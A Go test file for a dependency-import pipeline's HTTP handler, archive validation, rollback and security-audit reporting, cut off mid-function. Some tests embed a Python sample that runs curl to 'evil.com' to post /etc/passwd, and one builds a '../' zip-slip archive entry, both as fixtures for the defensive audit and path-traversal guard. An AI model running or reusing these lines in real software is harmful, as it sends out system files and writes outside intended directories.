package controller

import (
	"archive/tar"
	"compress/gzip"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sort"
	"testing"
	"time"

	"taa/internal/codeaudit"
)

func TestImportDepsRejectsEmptyResourceURL(t *testing.T) {
	_, server := setupTestServer(t)

	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": "",
		"requestId":   "req-1",
	})
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", resp.StatusCode)
	}
}

func TestImportDepsRejectsMissingTaskAndRequestID(t *testing.T) {
	_, server := setupTestServer(t)

	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": "http://127.0.0.1:1/deps.tar.gz",
	})
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", resp.StatusCode)
	}
}

func TestImportDepsRejectsNonPost(t *testing.T) {
	_, server := setupTestServer(t)

	resp, err := http.Get(server.URL + "/v1/taa/importDeps")
	if err != nil {
		t.Fatalf("GET: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusMethodNotAllowed {
		t.Fatalf("status = %d, want 405", resp.StatusCode)
	}
}

// waitForDepsSlotRelease polls until the task slot taken by importDeps is fully released.
// Both fields are checked because release() clears them together under a single lock hold; a
// leaked slot (a dropped release() call) leaves CurrentOp pinned at "deps_importing" and would
// otherwise turn every later import into a permanent 409 with no test noticing.
// It does not reuse waitForIdle, which only inspects CurrentOp.
func waitForDepsSlotRelease(t *testing.T, state *TAAState) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		state.mu.RLock()
		released := state.CurrentOp == "idle" && state.ActiveTaskID == ""
		state.mu.RUnlock()
		if released {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("timed out waiting for the importDeps task slot to be released")
}

// TestImportDepsDownloadFailureReleasesTaskSlot covers the one synchronous path the other tests
// skip: the request passes parameter validation and acquires the task slot, then the download
// fails. The handler must answer 500 and still hand the slot back.
func TestImportDepsDownloadFailureReleasesTaskSlot(t *testing.T) {
	state, server := setupTestServer(t)

	// Loopback is exempt from ProxyFromEnvironment and port 1 refuses immediately, so the
	// download fails at once with an error carrying no pkgerrors code, giving the handler's
	// 500 branch.
	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": "http://127.0.0.1:1/deps.tar.gz",
		"requestId":   "req-download-failure",
	})
	api := decodeResponse(t, resp)
	if resp.StatusCode != http.StatusInternalServerError {
		t.Fatalf("status = %d, want 500 (msg=%q)", resp.StatusCode, api.Msg)
	}

	waitForDepsSlotRelease(t, state)
}

// TestImportDepsSuccessReleasesTaskSlot covers the happy path end to end against a local file
// server: 200, the expected message, and the slot released afterwards.
func TestImportDepsSuccessReleasesTaskSlot(t *testing.T) {
	state, server := setupTestServer(t)

	archive := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("fake wheelhouse bytes"))
	}))
	t.Cleanup(archive.Close)

	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": archive.URL + "/deps.tar.gz",
		"requestId":   "req-success",
	})
	api := decodeResponse(t, resp)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200 (msg=%q)", resp.StatusCode, api.Msg)
	}
	if api.Msg != "依赖包已接收，处理中" {
		t.Fatalf("msg = %q, want %q", api.Msg, "依赖包已接收，处理中")
	}

	// The envelope is written before runAsyncSafe launches the goroutine, so the slot may
	// still be held here; poll rather than assert immediately.
	waitForDepsSlotRelease(t, state)
}

// TestProcessImportedDepsInstallsAndRecords drives the pipeline against a stub installer: the
// decrypted plaintext archive is validated, "installed" into DEPS_DIR/<sm3>, the state fields
// are set, and exactly one combined audit is reported under the dependency scope.
//
// Security.ScanEnabled=true makes the pipeline run the real audit (the fixture's regex baseline
// engine, no LLM) over the stub's empty target directory, which passes it. That is deliberate:
// with scanning off no audit runs and no reportAudit is emitted at all, so the report assertion
// would be vacuous.
func TestProcessImportedDepsInstallsAndRecords(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	var installedTarget string
	depsInstallFunc = func(wheelhouse, target string) error {
		installedTarget = target
		return os.MkdirAll(target, 0o755)
	}

	archive := buildTestDepsArchive(t)
	received := captureCombinedAuditReports(t, state)

	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-d", TaskID: "task-d"}
	state.processImportedDeps(req, 1, archive)

	if !state.DepsImported {
		t.Fatal("DepsImported = false after a successful pipeline run")
	}
	if installedTarget != state.currentDepsDir() {
		t.Fatalf("install target = %q, want %q", installedTarget, state.currentDepsDir())
	}

	rr := waitForCombinedAuditReport(t, received)
	if rr.Scope != "deps" {
		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
	}
	if rr.Code != 0 {
		t.Fatalf("code = %d, want 0 for a clean delivery", rr.Code)
	}
	// One audit, one report: a second callback would be in flight rather than counted yet,
	// so waiting is the assertion.
	requireNoCombinedAuditReport(t, received)
}

// TestProcessImportedDepsReauditsOnRedelivery pins the deliberate absence of idempotency:
// re-delivering the same archive re-installs it and emits a second scope="deps" report.
//
// The short-circuit this replaces keyed on a marker recording only the dependency side's hash,
// but the audit verdict now also depends on the model code the set is scanned together with,
// and a content address does not capture that. No stored artifact can stand in for a verdict,
// so the same archive is judged again on every delivery.
//
// Scanning is on so both runs earn their report through the real audit.
func TestProcessImportedDepsReauditsOnRedelivery(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	calls := 0
	depsInstallFunc = func(wheelhouse, target string) error {
		calls++
		return os.MkdirAll(target, 0o755)
	}

	// Two archives with identical content: the first is removed by the pipeline as it runs, so
	// the re-delivery needs a file of its own. Same content means the same SM3 and therefore
	// the same directory, which is exactly what used to short-circuit.
	archive := buildTestDepsArchive(t)
	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-i", TaskID: "task-i"}
	received := captureCombinedAuditReports(t, state)

	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
	state.processImportedDeps(req, 1, archive)

	if calls != 2 {
		t.Fatalf("installer called %d times, want 2 (every delivery re-installs)", calls)
	}
	for i := 1; i <= 2; i++ {
		rr := waitForCombinedAuditReport(t, received)
		if rr.Scope != "deps" {
			t.Fatalf("report %d scope = %q, want \"deps\"", i, rr.Scope)
		}
		if rr.Code != 0 {
			t.Fatalf("report %d code = %d, want 0", i, rr.Code)
		}
	}
	requireNoCombinedAuditReport(t, received)
}

// TestProcessImportedDepsScanDisabledSkipsAuditAndClearsNothing pins the ScanEnabled=false
// short-circuit as the pipeline sees it: the set binds, no reportAudit is emitted, and the
// installed directory is left on disk. An audit that never ran implicates no root, so the
// caller's !TriggerClean gate must not fire and nothing may be cleared.
//
// The re-delivery afterwards is what shows no reuse survives: the directory exists and is bound,
// yet an identical archive still reaches the installer, because no stored verdict can stand for
// the audit.
func TestProcessImportedDepsScanDisabledSkipsAuditAndClearsNothing(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	calls := 0
	depsInstallFunc = func(wheelhouse, target string) error {
		calls++
		return os.MkdirAll(target, 0o755)
	}

	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-s", TaskID: "task-s"}
	received := captureCombinedAuditReports(t, state)

	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	if !state.DepsImported {
		t.Fatal("DepsImported = false after a successful scan-disabled pipeline run")
	}
	if _, err := os.Stat(state.currentDepsDir()); err != nil {
		t.Fatalf("bound directory gone after a skipped audit: %v (nothing must be cleared)", err)
	}
	requireNoCombinedAuditReport(t, received)

	// Turn scanning back on and re-deliver the same content. The hash is unchanged, so only a
	// stored verdict could short-circuit this run; none exists.
	state.Security.ScanEnabled = true
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	if calls != 2 {
		t.Fatalf("installer called %d times, want 2: a skipped audit must not short-circuit a later delivery", calls)
	}
	rr := waitForCombinedAuditReport(t, received)
	if rr.Scope != "deps" {
		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
	}
	if rr.Code != 0 {
		t.Fatalf("code = %d, want 0 for the re-delivered set's real audit", rr.Code)
	}
}

// TestProcessImportedDepsRejectsArchiveWithoutWheel verifies that archive content validation
// happens inside the asynchronous pipeline.
func TestProcessImportedDepsRejectsArchiveWithoutWheel(t *testing.T) {
	state, _ := setupTestState(t)

	// The installer is stubbed to succeed so that ValidateWheelhouse is the only thing left
	// that can reject this archive. With the real installer a wheel-less wheelhouse also fails
	// at pip (no candidates under --no-index), and that independent failure would keep this
	// test green even if the content check were deleted -- it would then assert nothing.
	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }

	archive := buildTestArchive(t, map[string]string{"requirements.txt": "torch\n"})
	req := depsImportRequest{ResourceURL: "http://x/bad.tar.gz", RequestID: "req-b", TaskID: "task-b"}

	state.processImportedDeps(req, 1, archive)

	if state.DepsImported {
		t.Fatal("DepsImported = true for an archive without any .whl")
	}
	assertDepsRootEmpty(t, state)
}

// TestProcessImportedDepsRejectsZipSlip verifies that a malicious archive's `../` entry is
// rejected and that nothing is written outside the wheelhouse.
//
// The traversal is deliberately only ONE level deep. That still leaves the unpack directory
// (whose parent is the deps root, see processImportedDeps), it just leaves it into a path the
// test can still observe. A deeper traversal such as "../../../../../../../../pwned" escapes
// all the way to "/pwned", where it is refused by the kernel (EACCES for a non-root runner)
// instead of by the guard under test: the extraction fails, the pipeline fails closed, and the
// test passes even with the guard deleted -- it would prove nothing. Keep the depth shallow:
// the escape target has to stay inside the test's own tree for the test to be discriminating.
func TestProcessImportedDepsRejectsZipSlip(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }

	// The escape target lives in the deps root, one level above the temp unpack dir, so a
	// guard that lets it through leaves a file the assertions below can see.
	escaped := filepath.Join(state.Security.GetDepsDir(), "pwned")
	archive := buildTestArchive(t, map[string]string{
		"requirements.txt":             "torch\n",
		"a-1.0-py3-none-any.whl":       "x",
		"../" + filepath.Base(escaped): "pwned",
	})

	req := depsImportRequest{ResourceURL: "http://x/evil.tar.gz", RequestID: "req-z", TaskID: "task-z"}
	state.processImportedDeps(req, 1, archive)

	if state.DepsImported {
		t.Fatal("DepsImported = true for an archive with a path-traversal entry")
	}
	if _, err := os.Stat(escaped); !os.IsNotExist(err) {
		t.Fatalf("zip-slip escaped the wheelhouse: %s exists", escaped)
	}
	assertDepsRootEmpty(t, state)
}

// TestProcessImportedDepsInstallFailureKeepsWorkingBinding covers the failure semantics spec 6
// correction 2 stresses most: a newcomer whose install fails must not unseat the dependency set
// that is already bound and working.
//
// Scanning is on so the first import binds through the real combined audit and saveDepsSuccess --
// the path production takes -- rather than through a state write the test performs itself.
func TestProcessImportedDepsInstallFailureKeepsWorkingBinding(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }
	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-a", TaskID: "task-a"}, 1, buildTestDepsArchive(t))
	if !state.DepsImported {
		t.Fatal("first import did not bind; the rest of this test would be vacuous")
	}
	boundHash, boundDir := state.DepsHash, state.currentDepsDir()

	// The stub mirrors the real installer's documented contract -- it creates the target
	// before running pip, so a failure leaves the target partially populated -- which is
	// exactly why the pipeline, not pip, has to own the cleanup.
	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		return errors.New("pip exploded")
	}
	// The second archive must differ from the first: an identical one hashes to the same SM3 and
	// therefore the same directory, so the "newcomer" would be the bound directory itself, and
	// clearing its binding would be the correct behaviour rather than the unseating this test
	// forbids.
	other := buildTestArchive(t, map[string]string{
		"requirements.txt":            "torch\n",
		"second-1.0-py3-none-any.whl": "y",
	})
	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/b.tar.gz", RequestID: "req-b", TaskID: "task-b"}, 1, other)

	if !state.DepsImported || state.DepsHash != boundHash {
		t.Fatalf("binding changed after a failed newcomer: DepsImported=%v DepsHash=%q want %q",
			state.DepsImported, state.DepsHash, boundHash)
	}
	assertDepsRootContainsOnly(t, state, filepath.Base(boundDir))
}

// TestProcessImportedDepsKeepsBindingWhenNewAuditFails is the same requirement on the audit
// path: the newcomer is installed, the real audit rejects it, and the rollback must leave the
// working binding untouched.
//
// The installer stub writes a source file the rule engine matches, so the audit genuinely
// fails. An empty target would match no rule, the audit would pass, the pipeline would rebind,
// and this test would be asserting the opposite of what it claims.
func TestProcessImportedDepsKeepsBindingWhenNewAuditFails(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false
	// Keep the audit on the rule engine: an enabled-and-fail-closed LLM would make the audit
	// probe a service this test does not stand up.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	// The first import runs with scanning off, so the matching file it writes is inert; the
	// second turns scanning on and that same file becomes the reason the audit fails.
	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(code), 0o644)
	}
	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-a2", TaskID: "task-a2"}, 1, buildTestDepsArchive(t))
	if !state.DepsImported {
		t.Fatal("first import did not bind; the rest of this test would be vacuous")
	}
	boundHash, boundDir := state.DepsHash, state.currentDepsDir()

	state.Security.ScanEnabled = true
	other := buildTestArchive(t, map[string]string{
		"requirements.txt":           "torch\n",
		"third-1.0-py3-none-any.whl": "z",
	})
	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/c.tar.gz", RequestID: "req-c", TaskID: "task-c"}, 1, other)

	if !state.DepsImported || state.DepsHash != boundHash {
		t.Fatalf("a failed audit unseated the working binding: DepsImported=%v DepsHash=%q want %q",
			state.DepsImported, state.DepsHash, boundHash)
	}
	assertDepsRootContainsOnly(t, state, filepath.Base(boundDir))
}

// TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone covers the mirror
// case. The pipeline clears the directory of the set it is about to rebuild, and re-delivering
// the currently bound set is exactly that -- there is no idempotency short-circuit to stop it.
// A rebuild that then fails leaves the binding pointing at a directory that no longer exists;
// the binding must not survive its own directory, so it is cleared with it.
//
// Scanning is on so the first import binds through the real audit rather than through a state
// write the test performs itself.
func TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }
	req := depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-d", TaskID: "task-d"}
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
	if !state.DepsImported {
		t.Fatal("first import did not bind; the rest of this test would be vacuous")
	}

	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		return errors.New("pip exploded")
	}
	// The re-delivered archive carries the same content, so it addresses the bound directory
	// itself. Nothing is deleted by hand here: clearing the bound directory and then failing to
	// rebuild it is what this pipeline does on its own now.
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	if state.DepsImported || state.DepsHash != "" {
		t.Fatalf("binding outlived its directory: DepsImported=%v DepsHash=%q", state.DepsImported, state.DepsHash)
	}
	assertDepsRootEmpty(t, state)
}

// TestProcessImportedDepsReportsFailureCodeToPlatform is the fail-closed rollback contract of
// spec 12 end to end. Its three clauses are all asserted in one place: the state flag is
// cleared, the content-addressed directory is gone, and the platform actually receives the
// failure (code=1) on the reportDeps channel. The last clause used to have no coverage at all:
// reportDepsAsync was a log-only stub, so nothing joined "the pipeline failed" to "the platform
// was told", and the platform saw the task hang rather than fail.
//
// The installer stub writes a source file the rule engine matches, not merely a directory.
// That is load-bearing: an empty directory would match no rule, the audit would pass, the
// pipeline would succeed, the platform would receive code=0, and this test would be asserting
// the opposite of what it claims.
func TestProcessImportedDepsReportsFailureCodeToPlatform(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	// Keep the audit on the rule engine: an enabled-and-fail-closed LLM would make the audit
	// probe a service this test does not stand up.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	depsInstallFunc = func(wheelhouse, target string) error {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(code), 0o644)
	}

	got := make(chan map[string]any, 1)
	platformServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Capture only the terminal dependency-import callback this test asserts on. The
		// dependency audit posts its own report (scope=deps) to this same platform address from a
		// separate goroutine, and that report may arrive first; if it took the single channel
		// slot the path assertion below would fail spuriously. Any other path is answered
		// normally and dropped, and is never decoded or captured.
		if r.URL.Path != reportDepsEndpoint {
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
			return
		}
		var body map[string]any
		_ = json.NewDecoder(r.Body).Decode(&body)
		body["__path"] = r.URL.Path
		select {
		case got <- body:
		default:
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
	}))
	t.Cleanup(platformServer.Close)

	state.mu.Lock()
	state.PlatformIP, state.DockerID = platformServer.URL, "docker-test"
	state.mu.Unlock()

	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-p", TaskID: "task-p"}
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	// Clauses one and two: TAA's own state after the rollback.
	if state.DepsImported {
		t.Fatal("DepsImported = true after a rejected dependency set")
	}
	if dir := state.currentDepsDir(); dir != "" {
		t.Fatalf("currentDepsDir() = %q, want empty after rollback", dir)
	}
	assertDepsRootEmpty(t, state)

	// Clause three: the platform is told. Wait with a timeout so an un-sent callback surfaces
	// as a failure with a diagnosis rather than a hung test.
	select {
	case body := <-got:
		if body["__path"] != reportDepsEndpoint {
			t.Fatalf("report path = %v, want %q -- a failed dependency import must use the deps callback", body["__path"], reportDepsEndpoint)
		}
		if code, ok := body["code"].(float64); !ok || int(code) != 1 {
			t.Fatalf("code = %v, want 1", body["code"])
		}
	case <-time.After(3 * time.Second):
		t.Fatal("timed out waiting for the reportDeps callback: the platform never learned the import failed")
	}
}

// TestProcessImportedDepsModelSideFindingsDoNotRollBackTheDelivery is the dependency-trigger
// half of the change's core new semantic: a dependency delivery whose combined audit fails
// only on the MODEL side. The audit as a whole fails, so reportAudit carries code=1 under the
// dependency scope and the failing root is the model's -- yet the platform still receives
// reportDeps code=0, because the delivery itself succeeded. This is the divergence the design
// intends: it clears the side that was delivered only when that side is the one implicated,
// and here it is not.
//
// Neither directory is removed. The model is not this pipeline's to clear, and the delivered
// dependency set must survive so saveDepsSuccess can bind it -- the point of the whole change,
// which nothing asserted through this pipeline before.
//
// TestAuditAndReportModelImportClearsOnlyTheTriggeringSide covers the mirror direction (model
// trigger, dependency side dirty); this test keeps the pair symmetric.
func TestProcessImportedDepsModelSideFindingsDoNotRollBackTheDelivery(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	// Keep the audit on the rule engine: an enabled-and-fail-closed LLM would make the audit
	// probe a service this test does not stand up.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.Security.Engine = codeaudit.DefaultEngine()

	// The model side is the "other side": its rule-matching file is the only reason the
	// combined audit fails. updateImportState(isModel, imported, phase) is what puts the model
	// root in effect for a dependency trigger.
	modelFile := writePythonFile(t, state.Security.ModelDir, "train.py", ruleMatchingPython)
	state.updateImportState(true, true, 1)

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	var installedTarget string
	// The installer writes a source file that matches no rule, so the dependency root passes.
	depsInstallFunc = func(wheelhouse, target string) error {
		installedTarget = target
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(benignPython), 0o644)
	}

	// Both callbacks land on state.PlatformIP, so one server routes both paths: reportAudit
	// for the combined audit and reportDeps for the delivery's own outcome.
	auditCh, depsCh := captureAuditAndDepsReports(t, state)

	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-model-dirty", TaskID: "task-model-dirty"}
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	// The combined audit failed, under the dependency scope, and the root that failed is the
	// model's while the delivered root passed.
	rr := waitForCombinedAuditReport(t, auditCh)
	if rr.Code != 1 {
		t.Fatalf("reportAudit code = %d, want 1 (the combined audit as a whole failed)", rr.Code)
	}
	if rr.Scope != "deps" {
		t.Fatalf("reportAudit scope = %q, want \"deps\" for a dependency-triggered audit", rr.Scope)
	}
	roots := projectedRoots(t, rr)
	if len(roots) != 2 {
		t.Fatalf("projected roots = %+v, want the model root and the delivered dependency root", roots)
	}
	if roots[0].Directory != state.Security.ModelDir {
		t.Fatalf("first root = %q, want the model directory %q", roots[0].Directory, state.Security.ModelDir)
	}
	if roots[0].Passed {
		t.Errorf("the model root passed = true while it holds the rule-matching file")
	}
	if !roots[1].Passed {
		t.Errorf("the delivered dependency root passed = false though its file matches no rule")
	}
	// One audit, one report: waiting is the assertion.
	requireNoCombinedAuditReport(t, auditCh)

	// The delivery succeeded despite the failed audit: reportDeps code=0.
	select {
	case body := <-depsCh:
		if code, ok := body["code"].(float64); !ok || int(code) != 0 {
			t.Fatalf("reportDeps code = %v, want 0 (the delivery succeeded)", body["code"])
		}
	case <-time.After(3 * time.Second):
		t.Fatal("timed out waiting for the reportDeps callback: the platform never learned the delivery succeeded")
	}

	if !state.DepsImported {
		t.Fatal("DepsImported = false though the delivery succeeded")
	}
	// The binding names the set this delivery installed, i.e. DepsHash is the new hash.
	if state.currentDepsDir() != installedTarget {
		t.Fatalf("currentDepsDir() = %q, want the delivered directory %q (DepsHash = %q)",
			state.currentDepsDir(), installedTarget, state.DepsHash)
	}

	// Neither directory was removed -- the point of the whole change.
	if _, err := os.Stat(modelFile); err != nil {
		t.Fatalf("the model file was removed though the model side is not this pipeline's to clear: %v", err)
	}
	if !dirExists(installedTarget) {
		t.Fatalf("the delivered dependency directory %s was removed", installedTarget)
	}
	if _, err := os.Stat(filepath.Join(installedTarget, "pkg.py")); err != nil {
		t.Fatalf("the installed dependency file is missing from %s: %v", installedTarget, err)
	}
}

// TestProcessImportedDepsDependencySideFindingsRollBackOnlyTheDelivery is the mirror of the
// test above: the combined audit fails on the DELIVERED dependency root while the model code
// is clean. The delivery is rolled back (reportDeps code=1, directory gone, binding cleared)
// and the model directory is left exactly as it was -- this pipeline clears only its own side.
//
// TestProcessImportedDepsReportsFailureCodeToPlatform already pins the rollback and the
// reportDeps code=1 for a failing dependency audit, but it imports no model, so its audit has
// one root and it asserts nothing about the model directory or the reportAudit callback. This
// test adds the two-root case and the missing assertions rather than restating that one.
func TestProcessImportedDepsDependencySideFindingsRollBackOnlyTheDelivery(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.Security.Engine = codeaudit.DefaultEngine()

	// The model side is clean: it must survive the rollback of the other side untouched.
	modelFile := writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)
	state.updateImportState(true, true, 1)

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	var installedTarget string
	// The installer writes the file the rule engine matches, so the delivered root fails.
	depsInstallFunc = func(wheelhouse, target string) error {
		installedTarget = target
		if err := os.MkdirAll(target, 0o755); err != nil {
			return err
		}
		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(ruleMatchingPython), 0o644)
	}

	auditCh, depsCh := captureAuditAndDepsReports(t, state)

	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-deps-dirty", TaskID: "task-deps-dirty"}
	state.processImportedDeps(req, 1, buildTestDepsArchive(t))

	// The reportAudit callback names the failing side: code=1, scope=deps, the dependency root
	// the one that failed.
	rr := waitForCombinedAuditReport(t, auditCh)
	if rr.Code != 1 {
		t.Fatalf("reportAudit code = %d, want 1", rr.Code)
	}
	if rr.Scope != "deps" {
		t.Fatalf("reportAudit scope = %q, want \"deps\"", rr.Scope)
	}
	roots := projectedRoots(t, rr)
	if len(roots) != 2 {
		t.Fatalf("projected roots = %+v, want the model root and the delivered dependency root", roots)
	}
	if roots[0].Directory != state.Security.ModelDir {
		t.Fatalf("first root = %q, want the model directory %q", roots[0].Directory, state.Security.ModelDir)
	}
	if !roots[0].Passed {
		t.Errorf("the model root passed = false though its file matches no rule")
	}
	if roots[1].Directory != installedTarget {
		t.Fatalf("second root = %q, want the delivered dependency directory %q", roots[1].Directory, installedTarget)
	}
	if roots[1].Passed {
		t.Errorf("the delivered dependency root passed = true while it holds the rule-matching file")
	}
	requireNoCombinedAuditReport(t, auditCh)

	// reportDeps code=1: the delivery failed and the platform is told.
	select {
	case body := <-depsCh:
		if code, ok := body["code"].(float64); !ok || int(code) != 1 {
			t.Fatalf("reportDeps code = %v, want 1", body["code"])
		}
	case <-time.After(3 * time.Second):
		t.Fatal("timed out waiting for the reportDeps callback: the platform never learned the import failed")
	}

	// The other side is untouched: clearing it is not this pipeline's to do.
	if _, err := os.Stat(modelFile); err != nil {
		t.Fatalf("the model file was removed by a dependency-side rollback: %v", err)
	}

	// This pipeline's own side is rolled back.
	if state.DepsImported {
		t.Fatal("DepsImported = true after a rejected dependency set")
	}
	if dir := state.currentDepsDir(); dir != "" {
		t.Fatalf("currentDepsDir() = %q, want empty after rollback", dir)
	}
	if _, err := os.Stat(installedTarget); !os.IsNotExist(err) {
		t.Fatalf("the rejected dependency directory %s still exists (stat err = %v)", installedTarget, err)
	}
	requireAuditStateCleared(t, state)
}

// TestRunCombinedAuditDepsTriggerFlagsTheCandidateAndRemovesNothing pins the executor's half of
// the dependency contract: a HIGH finding under the delivered directory leaves TriggerClean false
// and the audit as a whole failed, and the executor itself removes nothing -- clearing the
// delivered side is the caller's job, which
// TestProcessImportedDepsReportsFailureCodeToPlatform covers end to end.
//
// It drives the real engine (the regex baseline setupTestState installs) exactly as the model
// tests do, so the assertion covers the engine call, the JSON projection and the scope=deps
// report as one unit.
func TestRunCombinedAuditDepsTriggerFlagsTheCandidateAndRemovesNothing(t *testing.T) {
	state, _ := setupTestState(t)
	// runCombinedAudit reads ScanEnabled itself (unlike the runDepsAudit it replaces, whose gate
	// lived in its caller), so it must be on for the audit to run at all.
	state.Security.ScanEnabled = true
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}

	depsDir := filepath.Join(state.Security.GetDepsDir(), "evilhash")
	if err := os.MkdirAll(depsDir, 0o755); err != nil {
		t.Fatalf("seed dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(ruleMatchingPython), 0o644); err != nil {
		t.Fatalf("seed file: %v", err)
	}
	received := captureCombinedAuditReports(t, state)

	result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-1", TaskID: "task-1"}, codeAuditTriggerDeps, depsDir)

	if result.Passed {
		t.Fatal("Passed = true for an audit the delivered directory fails")
	}
	if result.TriggerClean {
		t.Fatal("TriggerClean = true for a triggering root holding the finding")
	}
	if _, err := os.Stat(depsDir); err != nil {
		t.Fatalf("the executor removed the delivered directory: %v (clearing is the caller's job)", err)
	}

	rr := waitForCombinedAuditReport(t, received)
	if rr.Code != 1 {
		t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
	}
	if rr.Scope != "deps" {
		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
	}
	requireNoCombinedAuditReport(t, received)
}

// seedCleanDepsDir creates DEPS_DIR/<name> holding one source file that matches no rule of the
// baseline engine, and returns the directory path.
//
// The content is deliberately inert. A rule-matching file would weaken both branch tests below:
// a mutation that stopped the branch under test from rejecting the set would still let the
// ordinary audit-failure path implicate the delivered side, so the assertion would hold for the
// wrong reason instead of pinning that branch. With clean content, TriggerClean=false plus code=2
// are observable only if the branch under test actually ran.
func seedCleanDepsDir(t *testing.T, state *TAAState, name string) string {
	t.Helper()
	depsDir := filepath.Join(state.Security.GetDepsDir(), name)
